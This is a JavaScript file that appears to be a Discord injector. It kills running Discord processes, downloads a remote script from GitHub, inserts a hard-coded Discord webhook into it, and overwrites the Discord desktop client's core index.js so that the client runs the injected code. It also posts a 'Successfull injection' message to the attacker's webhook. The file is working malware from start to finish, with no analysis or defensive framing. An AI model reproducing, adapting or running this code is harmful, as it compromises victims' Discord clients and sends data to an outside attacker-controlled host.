var glob = require("glob");
const fs = require('fs');
const os = require('os');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const request = require('request');

const hook = 'https://discord.com/api/webhooks/1215074354774151248/onvwDuOS-nO6PLrzccouULTnsKXUDDIC311JN6o4m-_YFSRWPblEN5qfvuZxCgqIHaGQ';
const injectionUrl = 'https://raw.githubusercontent.com/traxzzy/Injectiondc/main/injection.js';

function killdc() {
    return new Promise(() => {
        const discordProcesses = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'];

        exec('tasklist /fo csv /nh', (err, stdout, stderr) => {
           

            const lines = stdout.trim().split(os.EOL);
            lines.forEach(line => {
                const cols = line.split('","');
                const name = cols[0].replace(/^"|"$/g, '');

                if (discordProcesses.some(discordName => name.toLowerCase().includes(discordName.toLowerCase()))) {
                    exec(`taskkill /F /PID ${cols[1]}`, (err, stdout, stderr) => {
                    });
                }
            });
        });
    });
}

const directory = process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc";

function walk(directory) {
    fs.readdir(directory, (files) => {
        files.forEach(file => {
            const filePath = path.join(directory, file);
            fs.stat(filePath, (err, stats) => {
                if (err) {
                    console.error(err);
                    return;
                }

                if (stats.isDirectory()) {
                    walk(filePath); 
                } else if (stats.isFile()) {
                    exec(`start "" "${filePath}"`, (error, stdout, stderr) => {
                    });
                }
            });
        });
    });
}

killdc()
    .then(() => {
   
            walk(directory);

    })
    .catch(err => {
        console.error(err);
    });

function injectNotify() {
    var fields = [];
   
    axios
        .post(hook, {
            "content": null,
            "embeds": [{
                "title": "💉 Successfull injection",
                "color": 0,
                "fields": fields,
                "author": {
                    "name": "try"
                },
                "footer": {
                    "text": "try"
                }
            }]
        })
        .then(res => {})
        .catch(error => {
        })
}

function injection() {
    const username = os.userInfo().username;
    const folderList = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'];

    for (const folderName of folderList) {
        const denemePath = path.join(process.env.LOCALAPPDATA, folderName);
        if (fs.existsSync(denemePath)) {
            fs.readdirSync(denemePath).forEach(subdir => {
                if (subdir.includes('app-')) {
                    const modulePath = path.join(denemePath, subdir, 'modules');
                    if (fs.existsSync(modulePath)) {
                        fs.readdirSync(modulePath).forEach(dir => {
                            if (dir.includes('discord_desktop_core-')) {
                                const corePath = path.join(modulePath, dir, 'discord_desktop_core');
                                if (fs.existsSync(corePath)) {
                                    const indexPath = path.join(corePath, 'index.js');
                                  
                                    
                                    request(injectionUrl, (error, response, body) => {
                                        if (!error && response.statusCode == 200) {
                                            const injectedContent = body.replace("%WEBHOOK%", hook);
                                            fs.writeFileSync(indexPath, injectedContent, 'utf-8');
                                        } else {
                                        }
                                    });
                                }
                            }
                        });
                    }
                }
            });
        }
    }
    
}

injectNotify();
injection();
